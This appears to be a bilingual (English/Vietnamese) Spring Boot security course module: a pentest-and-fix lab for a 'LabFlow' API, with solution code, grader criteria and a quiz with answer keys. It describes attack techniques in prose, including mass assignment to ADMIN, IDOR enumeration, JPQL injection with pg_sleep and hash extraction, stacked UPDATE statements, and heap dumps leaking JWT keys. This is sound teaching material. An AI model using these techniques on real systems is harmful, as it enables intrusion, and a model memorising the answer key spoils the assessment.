const MA106_HOSO = java("@RestController\nclass HoSoController {\n    record CapNhatHoSo(@Size(max = 100) String displayName,\n                       @Size(max = 255) @Pattern(regexp = \"https://.+\") String avatarUrl) { }\n    record HoSoView(String username, String role, String displayName, String avatarUrl) {\n        static HoSoView of(Account a) { return new HoSoView(a.getUsername(), a.getRole(), a.getDisplayName(), a.getAvatarUrl()); }\n    }\n\n    private final AccountRepository repo;\n    HoSoController(AccountRepository repo) { this.repo = repo; }\n\n    @GetMapping(\"/me\")\n    HoSoView xem(Authentication a) { return HoSoView.of(repo.findByUsername(a.getName()).orElseThrow()); }\n\n    @PatchMapping(\"/me\")\n    @Transactional\n    HoSoView sua(@Valid @RequestBody CapNhatHoSo r, Authentication a) {\n        Account acc = repo.findByUsername(a.getName()).orElseThrow();\n        if (r.displayName() != null) acc.setDisplayName(r.displayName());   // allow-list viết tay: từng trường một\n        if (r.avatarUrl() != null) acc.setAvatarUrl(r.avatarUrl());\n        return HoSoView.of(acc);\n    }\n}");
const MA106_TIM = java("/** Lượt đặt của tôi theo trạng thái. */\n@GetMapping(\"/bookings/search\")\nList<BookingView> tim(@RequestParam String status, Authentication a) {\n    if (!Set.of(\"PENDING\", \"APPROVED\", \"CANCELLED\").contains(status))\n        throw new ResponseStatusException(HttpStatus.BAD_REQUEST, \"status không hợp lệ\");\n    return em.createQuery(BookingRepository.VIEW + \"where s.studentCode = :me and b.status = :st order by b.startAt, b.id\",\n            BookingView.class).setParameter(\"me\", a.getName()).setParameter(\"st\", status).getResultList();\n}");
const MA106_CORS = java("/** Liệt kê ĐÚNG từng origin (đọc từ cấu hình), không dùng * hay mẫu đuôi tên miền. */\n@Bean\nCorsConfigurationSource corsConfigurationSource(@Value(\"${labflow.cors.origins}\") List<String> origins) {\n    CorsConfiguration c = new CorsConfiguration();\n    c.setAllowedOrigins(origins);\n    c.setAllowedMethods(List.of(\"GET\", \"POST\", \"PATCH\", \"DELETE\"));\n    c.setAllowedHeaders(List.of(\"Authorization\", \"Content-Type\"));\n    c.setAllowCredentials(true);\n    UrlBasedCorsConfigurationSource s = new UrlBasedCorsConfigurationSource();\n    s.registerCorsConfiguration(\"/**\", c);\n    return s;\n}");
const MA106_CHAIN = java(".authorizeHttpRequests(a -> a\n    .requestMatchers(\"/auth/**\", \"/error\").permitAll()\n    .requestMatchers(HttpMethod.GET, \"/labs\", \"/labs/*/bookings\").permitAll()\n    .requestMatchers(\"/actuator/health\").permitAll()     // bộ cân bằng tải chỉ cần biết UP/DOWN\n    .requestMatchers(\"/actuator/**\").hasRole(\"ADMIN\")\n    .anyRequest().authenticated())");
const PROPS106 = props("# Lab 10: chỉ mở health/info/metrics, và mở ở cổng quản trị riêng (không ánh xạ ra Internet)\nmanagement.endpoints.web.exposure.include=health,info,metrics\nmanagement.server.port=8081\nmanagement.endpoint.health.show-details=when-authorized\nlabflow.cors.origins=https://labflow.vn,http://localhost:5173");

const L106_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 10 · Lesson 10.6 · Lab</span>
<h2>Chapter 10 lab: pentest LabFlow, then fix it</h2>
<p class="lead">An intern finished "LabFlow 1.0" on top of your Lab 9 solution: a profile page, a booking search, CORS for the new frontend, monitoring for the operations team. Every feature works and every happy-path test is green. Before the release you play the attacker with the checklist of this chapter, prove each hole with a request, then close it without breaking the features. A grader replays real attacks over HTTP; it passes only when the attack fails <em>and</em> the legitimate use still works.</p>

<h3>The situation</h3>
<p>Release is on Monday. The faculty's security officer wants a short pentest report with each finding: the request that proves it, the impact, the fix, and how you verified it. Students are the attackers in this model: they have real accounts and a token, they read the frontend's network calls, and some of them are curious.</p>

<h3>Your tasks</h3>
<div class="callout ok"><ol>
  <li>Start from <code>lab10/starter</code> (main class <code>labflow.Lab10App</code>, Lab 9 + migration V5 for <code>display_name</code>/<code>avatar_url</code> + the intern's changes). Run it with the dev profile and the two environment variables of Lab 9.</li>
  <li>Pentest with the chapter's checklist, one lesson at a time: properties of objects (10.1), objects and functions by id (10.2), every query that takes input (10.3), CORS from a foreign origin (10.4), login speed, Actuator and secrets (10.5). For each finding, keep the exact request and response.</li>
  <li>Fix every finding in the code and configuration. Keep the features: profile editing, search by status, the frontend at <code>https://labflow.vn</code> and <code>http://localhost:5173</code>, health checks for the load balancer.</li>
  <li>Write the report: one row per finding (endpoint · proof · impact · fix · verified by).</li>
  <li>Run the grader: <code>bash lab10/cham.sh "$PWD/your-project"</code>.</li>
</ol></div>

<h3>Done when</h3>
<ul>
  <li>The grader prints <strong>8/8 three times in a row</strong> (each run starts from an empty database):
    <ol>
      <li><code>PATCH /me</code> with <code>role</code> and <code>passwordHash</code>: both ignored or 400, display name still editable, no hash in the response.</li>
      <li>Lan cannot view or cancel An's booking (403/404); An can view it.</li>
      <li>Approve: 403 for any student (even the owner), 200 for ADMIN.</li>
      <li><code>/bookings/search</code>: normal search works; the quote injection returns 400 or nothing; <code>pg_sleep</code> does not delay.</li>
      <li>CORS: <code>https://labflow.vn</code> allowed; <code>https://evil.example</code> and <code>https://evil-labflow.vn</code> get no <code>Access-Control-Allow-Origin</code>.</li>
      <li>Actuator: health is UP on 8080 or 8081; env, heapdump, configprops, mappings closed to anonymous users and to students, on both ports.</li>
      <li>Ten wrong passwords for one account ⇒ at least one 429 with <code>Retry-After</code>; another student can still log in.</li>
      <li>Normal use: <code>GET /labs</code>, booking, <code>GET /me</code>, own list.</li>
    </ol></li>
  <li>The report lists at least seven findings, each with a reproducible request.</li>
</ul>

<h3>What the starting point and the solution scored</h3>
<p>The starter scores <strong>1/8</strong>: only "normal use" passes, which is exactly why nobody noticed. The full output names every hole, so open it after your own pentest:</p>
${giai('Show the grader output for the starter', `${OUT106_STARTER}`)}
<p>The solution, three runs, each <strong>8/8</strong>:</p>
${OUT106_GIAI}

<h3>Three shortcuts we graded</h3>
<p>Each is a real "fix" seen in code reviews. Each scores 7/8:</p>
<ul>
  <li><strong>CORS pattern without the dot</strong> — <code>setAllowedOriginPatterns(List.of("https://*labflow.vn"))</code> "to allow every subdomain". It also allows anyone who registers <code>evil-labflow.vn</code>:
${OUT106_BAY_CORS}</li>
  <li><strong>Only removing <code>permitAll</code> from Actuator</strong> — everything is still exposed, now to any logged-in user. Every student can download the heap dump:
${OUT106_BAY_ACT}</li>
  <li><strong>IDOR fixed on GET only</strong> — view is protected, cancel is not. Attackers try every verb:
${OUT106_BAY_HUY}</li>
</ul>

<h3>Scoring out of 10</h3>
<table>
  <tr><th>Part</th><th>Points</th></tr>
  <tr><td>Grader items 1–8</td><td>1 each (8)</td></tr>
  <tr><td>Pentest report: every finding with proof request, impact, fix, verification</td><td>1</td></tr>
  <tr><td>Report explains one trap from this lab or the lessons (e.g. why a 500 does not mean the injection failed, why CSRF was silently off)</td><td>1</td></tr>
</table>

${giai('Show the solution (only after your own attempt)', `
<p><strong>1. Profile:</strong> request and response records, as in lesson 10.1.</p>
${MA106_HOSO}
<p><strong>2–3. Ownership and roles:</strong> put back <code>@PreAuthorize("@quyen.chuHoacAdmin(#id, authentication)")</code> on <code>GET /bookings/{id}</code> <em>and</em> <code>PATCH /bookings/{id}/cancel</code>, and <code>@PreAuthorize("hasRole('ADMIN')")</code> on approve (lesson 10.2).</p>
<p><strong>4. Search:</strong> allow-list for the value, parameters in the query (lesson 10.3).</p>
${MA106_TIM}
<p><strong>5–6. CORS and Actuator:</strong> explicit origins from configuration; Actuator rules in the chain; minimal exposure on a management port (lessons 10.4, 10.5).</p>
${MA106_CORS}
${MA106_CHAIN}
${PROPS106}
<p><strong>7. Login limit:</strong> the Bucket4j filter of lesson 10.5 (<code>GioiHanDangNhap</code>, always on), with <code>setCharacterEncoding("UTF-8")</code>. Bucket4j is already in the starter's POM.</p>
`)}

<h3>🎤 What the interviewer will ask (Chapter 10)</h3>
<ol>
  <li><strong>"Name the top API risks you check in a code review."</strong> — BOLA (ownership on every object), BOPLA (DTOs in and out), BFLA (roles on functions), injection (parameters, allow-lists), misconfiguration (CORS, Actuator), resource consumption (rate limits), secrets.</li>
  <li><strong>"How would you test that a new endpoint is not an IDOR?"</strong> — Two users, the second calls the first one's id; automate it over all routes with ids (lesson 10.2's test).</li>
  <li><strong>"A pentester says your search is injectable but your API returned 500. Is it serious?"</strong> — Yes: blind techniques read data through yes/no or timing, and stacked statements may commit before the error.</li>
  <li><strong>"Your frontend team asks for allowedOriginPatterns("*") because of CORS errors. What do you answer?"</strong> — Find the real failing preflight (often 401), add their exact origins per environment; patterns only for owned subdomains with the dot.</li>
  <li><strong>"What do you do in the first hour after a signing key leaks?"</strong> — Rotate, invalidate sessions/refresh tokens, search logs for forged tokens, then fix the leak path (Actuator, Git).</li>
</ol>

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Pentest</span><span class="v">Penetration test: attacking your own system with permission to find exploitable holes.</span></div>
  <div class="kv"><span class="k">Finding</span><span class="v">One vulnerability in a report, with proof, impact and fix.</span></div>
  <div class="kv"><span class="k">Proof of concept</span><span class="v">The minimal request or script that demonstrates a finding.</span></div>
  <div class="kv"><span class="k">OWASP API Top 10</span><span class="v">The ten most critical API security risks (2023 edition), the checklist of this chapter.</span></div>
  <div class="kv"><span class="k">Regression check</span><span class="v">Verifying that a fix did not break legitimate use (grader item 8).</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
  <li>A green happy path proved nothing: the starter scored 1/8.</li>
  <li>Every lesson of the chapter became one or two grader items, each an attack replayed over HTTP.</li>
  <li>Half-fixes (pattern without a dot, Actuator open to students, IDOR fixed on one verb) each lost a point.</li>
  <li>A pentest report is part of the job: proof, impact, fix, verification.</li>
</ul>

<h3>Sources</h3>
<ul>
  <li>Grader and code: <code>lab/c10/lab10/{starter, giai, cham.sh}</code>; traps in <code>~/.rtq-sb/c1010/bay/{cors, actuator, huy}</code>; Spring Boot 4.1.2, Spring Security 7.1.2, Bucket4j 8.14.0, PostgreSQL 16.15 (20/11/2026).</li>
  <li>OWASP API Security Top 10, 2023 edition.</li>
</ul>
</div>
`;

const L106_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 10 · Bài 10.6 · Lab</span>
<h2>Lab chương 10: pentest LabFlow, rồi vá</h2>
<p class="lead">Một bạn thực tập sinh đã làm xong "LabFlow 1.0" dựa trên lời giải Lab 9 của bạn: trang hồ sơ, tìm kiếm lượt đặt, CORS cho frontend mới, giám sát cho đội vận hành. Tính năng nào cũng chạy, test luồng chuẩn nào cũng xanh. Trước ngày phát hành, bạn đóng vai kẻ tấn công với danh sách kiểm của chương này, chứng minh từng lỗ hổng bằng một request, rồi vá mà không làm gãy tính năng. Bộ chấm phát lại tấn công thật qua HTTP; chỉ đạt khi tấn công THẤT BẠI <em>và</em> cách dùng hợp lệ vẫn chạy.</p>

<h3>Tình huống</h3>
<p>Thứ Hai phát hành. Cán bộ an ninh thông tin của khoa muốn một báo cáo pentest ngắn, mỗi phát hiện gồm: request chứng minh, tác động, cách vá, và bạn đã kiểm lại thế nào. Trong mô hình này kẻ tấn công là sinh viên: có tài khoản thật và token, đọc được các lời gọi mạng của frontend, và có người tò mò.</p>

<h3>Việc của bạn</h3>
<div class="callout ok"><ol>
  <li>Bắt đầu từ <code>lab10/starter</code> (lớp chính <code>labflow.Lab10App</code>, Lab 9 + migration V5 cho <code>display_name</code>/<code>avatar_url</code> + phần bạn thực tập thêm). Chạy với profile dev và hai biến môi trường của Lab 9.</li>
  <li>Pentest theo danh sách kiểm của chương, từng bài một: thuộc tính của đối tượng (10.1), đối tượng và chức năng theo id (10.2), mọi truy vấn nhận đầu vào (10.3), CORS từ một origin lạ (10.4), tốc độ đăng nhập, Actuator và bí mật (10.5). Mỗi phát hiện giữ lại đúng request và phản hồi.</li>
  <li>Vá mọi phát hiện trong mã và cấu hình. Giữ nguyên tính năng: sửa hồ sơ, tìm theo trạng thái, frontend ở <code>https://labflow.vn</code> và <code>http://localhost:5173</code>, health check cho bộ cân bằng tải.</li>
  <li>Viết báo cáo: mỗi phát hiện một dòng (tuyến · bằng chứng · tác động · cách vá · kiểm lại bằng gì).</li>
  <li>Chạy bộ chấm: <code>bash lab10/cham.sh "$PWD/du-an-cua-ban"</code>.</li>
</ol></div>

<h3>Đạt khi</h3>
<ul>
  <li>Bộ chấm in <strong>8/8 ba lần liên tiếp</strong> (mỗi lượt bắt đầu từ CSDL trống):
    <ol>
      <li><code>PATCH /me</code> kèm <code>role</code> và <code>passwordHash</code>: cả hai bị bỏ qua hoặc 400, tên hiển thị vẫn sửa được, phản hồi không có băm.</li>
      <li>Lan không xem, không huỷ được lượt của An (403/404); An xem được.</li>
      <li>Duyệt: 403 với mọi sinh viên (kể cả chủ lượt đặt), 200 với ADMIN.</li>
      <li><code>/bookings/search</code>: tìm bình thường chạy; chuỗi tiêm dấu nháy trả 400 hoặc rỗng; <code>pg_sleep</code> không làm chậm.</li>
      <li>CORS: <code>https://labflow.vn</code> được phép; <code>https://evil.example</code> và <code>https://evil-labflow.vn</code> không nhận <code>Access-Control-Allow-Origin</code>.</li>
      <li>Actuator: health UP ở 8080 hoặc 8081; env, heapdump, configprops, mappings đóng với khách ẩn danh và với sinh viên, ở cả hai cổng.</li>
      <li>Mười lần sai mật khẩu một tài khoản ⇒ có ít nhất một 429 kèm <code>Retry-After</code>; sinh viên khác vẫn đăng nhập được.</li>
      <li>Dùng bình thường: <code>GET /labs</code>, đặt phòng, <code>GET /me</code>, danh sách của mình.</li>
    </ol></li>
  <li>Báo cáo có ít nhất bảy phát hiện, mỗi phát hiện kèm một request tái hiện được.</li>
</ul>

<h3>Điểm xuất phát và lời giải được bao nhiêu</h3>
<p>Bản khởi đầu được <strong>1/8</strong>: chỉ "dùng bình thường" đạt, cũng chính là lý do không ai để ý. Output đầy đủ chỉ thẳng từng lỗ, nên chỉ mở sau khi bạn tự pentest xong:</p>
${giai('Xem output bộ chấm với bản khởi đầu', `${OUT106_STARTER}`)}
<p>Lời giải, ba lượt, mỗi lượt <strong>8/8</strong>:</p>
${OUT106_GIAI}

<h3>Ba lối tắt chúng tôi đã chấm</h3>
<p>Mỗi cái là một kiểu "vá" có thật hay gặp khi review mã. Mỗi cái được 7/8:</p>
<ul>
  <li><strong>Mẫu CORS thiếu dấu chấm</strong> — <code>setAllowedOriginPatterns(List.of("https://*labflow.vn"))</code> "để cho mọi tên miền con". Nó cho luôn bất kỳ ai đăng ký được <code>evil-labflow.vn</code>:
${OUT106_BAY_CORS}</li>
  <li><strong>Chỉ gỡ <code>permitAll</code> khỏi Actuator</strong> — mọi thứ vẫn mở, giờ là cho mọi người đã đăng nhập. Sinh viên nào cũng tải được heap dump:
${OUT106_BAY_ACT}</li>
  <li><strong>IDOR chỉ vá ở GET</strong> — xem được bảo vệ, huỷ thì không. Kẻ tấn công thử mọi phương thức:
${OUT106_BAY_HUY}</li>
</ul>

<h3>Thang 10 điểm</h3>
<table>
  <tr><th>Phần</th><th>Điểm</th></tr>
  <tr><td>Mục 1–8 của bộ chấm</td><td>mỗi mục 1 (8)</td></tr>
  <tr><td>Báo cáo pentest: mỗi phát hiện có request chứng minh, tác động, cách vá, cách kiểm lại</td><td>1</td></tr>
  <tr><td>Báo cáo giải thích một cái bẫy của lab hoặc của các bài (vd vì sao lỗi 500 không có nghĩa là tiêm thất bại, vì sao CSRF bị tắt câm)</td><td>1</td></tr>
</table>

${giai('Xem lời giải (chỉ sau khi đã tự làm)', `
<p><strong>1. Hồ sơ:</strong> record request và response, như bài 10.1.</p>
${MA106_HOSO}
<p><strong>2–3. Chủ sở hữu và vai trò:</strong> đặt lại <code>@PreAuthorize("@quyen.chuHoacAdmin(#id, authentication)")</code> trên <code>GET /bookings/{id}</code> <em>và</em> <code>PATCH /bookings/{id}/cancel</code>, và <code>@PreAuthorize("hasRole('ADMIN')")</code> trên duyệt (bài 10.2).</p>
<p><strong>4. Tìm kiếm:</strong> danh sách cho phép cho giá trị, tham số trong truy vấn (bài 10.3).</p>
${MA106_TIM}
<p><strong>5–6. CORS và Actuator:</strong> origin tường minh đọc từ cấu hình; luật Actuator trong chuỗi; mở tối thiểu trên cổng quản trị (bài 10.4, 10.5).</p>
${MA106_CORS}
${MA106_CHAIN}
${PROPS106}
<p><strong>7. Giới hạn đăng nhập:</strong> filter Bucket4j của bài 10.5 (<code>GioiHanDangNhap</code>, luôn bật), kèm <code>setCharacterEncoding("UTF-8")</code>. Bucket4j đã có sẵn trong POM của bản khởi đầu.</p>
`)}

<h3>🎤 Phỏng vấn viên sẽ hỏi (Chương 10)</h3>
<ol>
  <li><strong>"Kể các rủi ro API hàng đầu bạn kiểm khi review mã."</strong> — BOLA (kiểm chủ trên mọi đối tượng), BOPLA (DTO vào và ra), BFLA (vai trò trên chức năng), injection (tham số, danh sách cho phép), cấu hình sai (CORS, Actuator), tiêu thụ tài nguyên (giới hạn tần suất), bí mật.</li>
  <li><strong>"Kiểm một tuyến mới không phải IDOR thế nào?"</strong> — Hai người dùng, người thứ hai gọi id của người thứ nhất; tự động hoá trên mọi tuyến có id (test của bài 10.2).</li>
  <li><strong>"Pentester báo tìm kiếm của bạn bị tiêm nhưng API chỉ trả 500. Có nghiêm trọng không?"</strong> — Có: kỹ thuật mù đọc dữ liệu qua có/không hoặc thời gian, và câu lệnh chồng có thể commit trước khi lỗi.</li>
  <li><strong>"Đội frontend xin allowedOriginPatterns("*") vì lỗi CORS. Bạn trả lời sao?"</strong> — Tìm preflight thật đang trượt (thường là 401), thêm đúng origin của họ theo từng môi trường; mẫu chỉ cho tên miền con của mình, có dấu chấm.</li>
  <li><strong>"Giờ đầu tiên sau khi lộ khoá ký, bạn làm gì?"</strong> — Xoay khoá, vô hiệu hoá phiên/refresh token, tìm trong log dấu vết token giả, rồi bịt đường lộ (Actuator, Git).</li>
</ol>

<h3>🗂 Thuật ngữ</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Pentest</span><span class="v">Kiểm thử xâm nhập: tấn công hệ thống của chính mình (có cho phép) để tìm lỗ khai thác được.</span></div>
  <div class="kv"><span class="k">Phát hiện (finding)</span><span class="v">Một lỗ hổng trong báo cáo, kèm bằng chứng, tác động và cách vá.</span></div>
  <div class="kv"><span class="k">Proof of concept</span><span class="v">Request hoặc script tối thiểu chứng minh một phát hiện.</span></div>
  <div class="kv"><span class="k">OWASP API Top 10</span><span class="v">Mười rủi ro bảo mật API nghiêm trọng nhất (bản 2023), danh sách kiểm của chương này.</span></div>
  <div class="kv"><span class="k">Kiểm hồi quy</span><span class="v">Kiểm rằng bản vá không làm gãy cách dùng hợp lệ (mục 8 của bộ chấm).</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>Luồng chuẩn xanh không chứng minh gì: bản khởi đầu được 1/8.</li>
  <li>Mỗi bài của chương thành một hai mục chấm, mỗi mục là một tấn công phát lại qua HTTP.</li>
  <li>Vá nửa vời (mẫu thiếu dấu chấm, Actuator mở cho sinh viên, IDOR vá một phương thức) mỗi cái mất một điểm.</li>
  <li>Báo cáo pentest là một phần của nghề: bằng chứng, tác động, cách vá, kiểm lại.</li>
</ul>

<h3>Nguồn</h3>
<ul>
  <li>Bộ chấm và mã: <code>lab/c10/lab10/{starter, giai, cham.sh}</code>; các bẫy ở <code>~/.rtq-sb/c1010/bay/{cors, actuator, huy}</code>; Spring Boot 4.1.2, Spring Security 7.1.2, Bucket4j 8.14.0, PostgreSQL 16.15 (20/11/2026).</li>
  <li>OWASP API Security Top 10, bản 2023.</li>
</ul>
</div>
`;

const Q = (question, options, correctIndex) => ({ question, options, correctIndex, points: 1 });
const QUIZ10 = [
  Q('PATCH /v0/me merged the body into the Account entity with readerForUpdating and Lan sent "role":"ADMIN". Why could she still not approve bookings right after the request?|||PATCH /v0/me trộn thân request vào entity Account bằng readerForUpdating và Lan gửi "role":"ADMIN". Vì sao ngay sau request đó Lan vẫn chưa duyệt được lượt đặt?', [
    'The CHECK constraint rejected ADMIN|||Ràng buộc CHECK từ chối ADMIN',
    'Her old JWT still carried roles [STUDENT]; the new role took effect at the next login|||JWT cũ vẫn mang roles [STUDENT]; vai trò mới chỉ có hiệu lực từ lần đăng nhập sau',
    'Hibernate does not write changes without save()|||Hibernate không ghi thay đổi nếu không gọi save()',
    'Jackson ignores unknown properties by default|||Jackson mặc định bỏ qua thuộc tính lạ',
  ], 1),
  Q('Which change fixes mass assignment on the profile endpoint by design (allow-list)?|||Thay đổi nào vá mass assignment ở tuyến hồ sơ theo kiểu danh sách cho phép?', [
    'Add @JsonIgnore on the role field of the entity|||Thêm @JsonIgnore lên trường role của entity',
    'Turn on fail-on-unknown-properties and keep the entity as @RequestBody|||Bật fail-on-unknown-properties và giữ entity làm @RequestBody',
    'A request record with only displayName and avatarUrl, copied explicitly, and a view record as response|||Một record request chỉ có displayName và avatarUrl, chép tường minh, và một record view làm phản hồi',
    'Return 403 when the body contains "role"|||Trả 403 khi thân request có chữ "role"',
  ], 2),
  Q('A loop over /v0/bookings/1..40 returned 30 × 200 and 10 × 404. What does the attacker learn from the 404s?|||Vòng lặp qua /v0/bookings/1..40 nhận 30 × 200 và 10 × 404. Kẻ tấn công biết thêm gì từ các 404?', [
    'Nothing, 404 hides everything|||Không gì, 404 giấu hết',
    'Which ids exist, i.e. the size of the table|||Id nào tồn tại, tức kích thước của bảng',
    'The database password|||Mật khẩu CSDL',
    'That the endpoint is protected|||Rằng tuyến này đã được bảo vệ',
  ], 1),
  Q('What did the IdorTest of lesson 10.2 do that a hand-written test list cannot?|||IdorTest của bài 10.2 làm được gì mà một danh sách test viết tay không làm được?', [
    'It used a real browser|||Nó dùng trình duyệt thật',
    'It asked RequestMappingHandlerMapping for every GET route with {id}, so routes added later are tested too|||Nó hỏi RequestMappingHandlerMapping mọi tuyến GET có {id}, nên tuyến thêm sau này cũng bị kiểm',
    'It disabled Spring Security|||Nó tắt Spring Security',
    'It generated UUIDs for every booking|||Nó sinh UUID cho mọi lượt đặt',
  ], 1),
  Q('The search concatenated status into JPQL. How did a script read the admin password hash although the endpoint only returns bookings?|||Tuyến tìm kiếm nối status vào JPQL. Một script đọc được chuỗi băm mật khẩu admin bằng cách nào, dù tuyến chỉ trả lượt đặt?', [
    'By asking yes/no questions through an EXISTS subquery on Account and watching whether rows came back|||Bằng các câu hỏi có/không qua truy vấn con EXISTS trên Account, nhìn xem có dòng trả về hay không',
    'Hibernate returns the hash in an error message|||Hibernate trả chuỗi băm trong thông báo lỗi',
    'JPQL can only read Booking, so it could not|||JPQL chỉ đọc được Booking nên không thể',
    'By downloading the heap dump|||Bằng cách tải heap dump',
  ], 0),
  Q('sort=start_at; update accounts set role = \'ADMIN\' ... on a native query answered HTTP 500. What happened in the database?|||sort=start_at; update accounts set role = \'ADMIN\' ... vào một native query trả HTTP 500. Trong CSDL đã xảy ra gì?', [
    'Nothing, the error rolled everything back|||Không gì, lỗi đã rollback tất cả',
    'The UPDATE ran and was committed in auto-commit mode before the "Multiple ResultSets" error|||Câu UPDATE đã chạy và được commit ở chế độ tự commit trước lỗi "Multiple ResultSets"',
    'PostgreSQL refuses more than one statement|||PostgreSQL từ chối nhiều hơn một câu lệnh',
    'The account was locked|||Tài khoản bị khoá',
  ], 1),
  Q('Which CORS configuration answered a preflight from https://evil.example with Access-Control-Allow-Origin: https://evil.example and credentials true?|||Cấu hình CORS nào trả lời preflight từ https://evil.example bằng Access-Control-Allow-Origin: https://evil.example kèm credentials true?', [
    'allowedOrigins = [https://labflow.vn]|||allowedOrigins = [https://labflow.vn]',
    'addAllowedOrigin("*") with allowCredentials(true)|||addAllowedOrigin("*") kèm allowCredentials(true)',
    'addAllowedOriginPattern("*") with allowCredentials(true)|||addAllowedOriginPattern("*") kèm allowCredentials(true)',
    'No CORS configuration at all|||Không cấu hình CORS',
  ], 2),
  Q('The JWT was read from a cookie by a custom BearerTokenResolver, and http.csrf(c -> c.spa()) was enabled. The forged cross-site booking still returned 201. Why?|||JWT được đọc từ cookie bằng một BearerTokenResolver tự viết, và đã bật http.csrf(c -> c.spa()). Lượt đặt giả mạo xuyên site vẫn trả 201. Vì sao?', [
    'spa() only protects GET requests|||spa() chỉ bảo vệ request GET',
    'The resource server makes CsrfFilter ignore requests matched by BearerTokenRequestMatcher, which used the cookie-reading resolver|||Resource server bắt CsrfFilter bỏ qua request khớp BearerTokenRequestMatcher, mà bộ so khớp này dùng resolver đọc cookie',
    'SameSite=Lax let the request through|||SameSite=Lax cho request đi qua',
    'The XSRF-TOKEN cookie was readable by evil.example|||Cookie XSRF-TOKEN đọc được từ evil.example',
  ], 1),
  Q('With Bucket4j limiting 5 attempts per minute per user name and 20 per IP, what did 25 logins on 25 different accounts from one IP get?|||Bucket4j giới hạn 5 lần/phút theo tên và 20 lần/phút theo IP. 25 lần đăng nhập vào 25 tài khoản khác nhau từ một IP nhận được gì?', [
    '25 × 401|||25 × 401',
    '5 × 401 then 20 × 429|||5 × 401 rồi 20 × 429',
    '20 × 401 then 5 × 429|||20 × 401 rồi 5 × 429',
    '25 × 429|||25 × 429',
  ], 2),
  Q('/actuator/env showed the JWT secret as "******". Why was the secret still stolen?|||/actuator/env hiện khoá JWT là "******". Vì sao khoá vẫn bị lấy?', [
    'The mask is reversible base64|||Lớp che là base64 giải ngược được',
    'The heap dump endpoint was open, and the environment values are plain strings in JVM memory|||Tuyến heap dump đang mở, và giá trị biến môi trường là chuỗi thường trong bộ nhớ JVM',
    '/actuator/configprops shows unmasked values|||/actuator/configprops hiện giá trị không che',
    'The secret was printed in the startup log|||Khoá được in ra log khởi động',
  ], 1),
];

const L = (n, slug, en, vi, description, content) => ({
  title: `10.${n} — ${en}|||10.${n} — ${vi}`, slug, type: 'LESSON', isFreePreview: false, description, content,
});

export default {
  title: 'Chapter 10 — The hacker\'s view: securing a Spring API|||Chương 10 — Góc nhìn hacker: bảo vệ API Spring',
  description: 'Tấn công thật vào LabFlow rồi vá, đo trên Spring Boot 4.1.2: mass assignment thành ADMIN sau một lần đăng nhập lại, lộ băm qua entity, Spring4Shell; IDOR đọc 30 lượt đặt của 25 sinh viên trong 454 ms, BFLA, test tự quét mọi tuyến có {id}; JPQL nối chuỗi rút cả chuỗi băm admin sau 483 request, pg_sleep 60 giây, ORDER BY native chạy UPDATE dù trả 500; CORS bốn cấu hình, CSRF tắt câm khi JWT nằm trong cookie; Bucket4j 429, heapdump lộ khoá JWT, gitleaks; Lab 10 pentest 8 mục.',
  lessons: [
    L(1, 'sb-10-1-mass-assignment', 'Mass assignment', 'Mass assignment',
      'Đổ body vào entity bằng readerForUpdating: thêm "role":"ADMIN" ⇒ ADMIN từ lần đăng nhập sau (JWT là ảnh chụp lúc đăng nhập), phản hồi entity lộ passwordHash, đổi id ⇒ 500 của Hibernate; @ModelAttribute cùng lỗi, tham số Spring4Shell bị chặn; vá bằng record vào + record ra + validation, fail-on-unknown-properties ⇒ 400; Object.assign và __proto__ trong Node; GitHub 2012, CVE-2022-22965.',
      L101_EN + L101_VI),
    L(2, 'sb-10-2-idor', 'IDOR and broken object-level authorization', 'IDOR và phân quyền cấp đối tượng',
      'Đổi id xem lượt đặt kèm email và số điện thoại; vòng lặp 40 id: 30 lượt của 25 sinh viên trong 454 ms, 404 lộ kích thước bảng; BFLA sinh viên tự duyệt; vá bằng @PreAuthorize + bean kiểm chủ (403 như nhau) hoặc truy vấn theo chủ (404); UUID không phải bản vá; test MockMvc + jwt() tự liệt kê mọi tuyến GET có {id} và bắt được /v0; Optus 2022.',
      L102_EN + L102_VI),
    L(3, 'sb-10-3-injection-jpql', 'Injection in JPQL and native queries', 'Injection trong JPQL và native query',
      'JPQL nối chuỗi: một dấu nháy ⇒ 30 dòng; dấu nháy cuối bị bộ tách từ bỏ qua (200), dấu nháy giữa ⇒ 500; rút cả chuỗi băm admin qua EXISTS + function(\'ascii\') sau 483 request (6 giây); function(\'pg_sleep\') 2 giây và 60 giây; ORDER BY native: dò theo thời gian và câu UPDATE chồng vẫn commit dù trả 500; vá bằng tham số + danh sách cột cho phép; Sort của Spring Data; pg của Node; MOVEit 2023.',
      L103_EN + L103_VI),
    L(4, 'sb-10-4-cors-csrf', 'CORS and CSRF for a JWT API', 'CORS và CSRF cho API dùng JWT',
      'Preflight thật với bốn cấu hình: không cấu hình ⇒ 401, origin tường minh ⇒ 200/403, * kèm credentials ⇒ 500 mọi request, mẫu * kèm credentials ⇒ nhắc lại mọi origin; CSRF: JWT trong header không cần (giả mạo 401), JWT trong cookie bị giả mạo 201 và vẫn 201 khi bật csrf().spa() vì BearerTokenRequestMatcher; SameSite, refresh cookie; Kettle 2016, ING Direct 2008.',
      L104_EN + L104_VI),
    L(5, 'sb-10-5-rate-limit-secret', 'Rate limiting, secrets and Actuator exposure', 'Giới hạn tần suất, bí mật và lộ Actuator',
      'Dò 100 mật khẩu: trúng sau 87 lần trong 6,5 giây; Bucket4j theo tên + theo IP ⇒ 5 × 401, 95 × 429, Retry-After, bẫy bảng mã ISO-8859-1; Actuator include=* (Boot 4.1.2 vẫn giấu heapdump tới khi access=unrestricted), heapdump 74 MB lộ khoá JWT ⇒ token ADMIN giả ⇒ 200; cổng quản trị 8081; gitleaks bắt bí mật trong lịch sử, xoay khoá trước; Volkswagen/Cariad 2024, Uber 2016.',
      L105_EN + L105_VI),
    L(6, 'sb-10-6-lab-10', 'Chapter 10 lab + interview questions', 'Lab chương 10 + câu hỏi phỏng vấn',
      'Pentest LabFlow 1.0 theo danh sách kiểm của chương rồi vá: bộ chấm 8 mục phát lại tấn công qua HTTP (mass assignment, IDOR, BFLA, injection, CORS, Actuator, giới hạn đăng nhập, luồng đúng); bản khởi đầu 1/8, lời giải 8/8 ×3; ba lối tắt 7/8; báo cáo pentest; 5 câu phỏng vấn của chương.',
